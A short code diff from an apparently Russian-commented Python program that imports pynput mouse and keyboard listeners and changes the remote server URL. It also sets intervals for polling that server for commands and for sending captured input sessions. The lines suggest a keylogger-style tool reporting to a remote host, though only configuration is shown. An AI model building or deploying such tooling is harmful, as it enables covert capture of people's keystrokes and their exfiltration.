@@ -15,7 +15,7 @@ from pynput import mouse, keyboard
 # ════════════════════════════════════════
 #  НАСТРОЙКИ — замени IP на свой сервер
 # ════════════════════════════════════════
-SERVER_URL = "https://074bb2d5c5219122-185-237-220-25.serveousercontent.com"   # адрес сервера
+SERVER_URL = "https://web-production-583b7.up.railway.app"   # адрес сервера
 POLL_INTERVAL  = 5     # секунд между проверками команд
 SEND_MIN_SECS  = 3     # не отправлять сессии короче 3 секунд
 
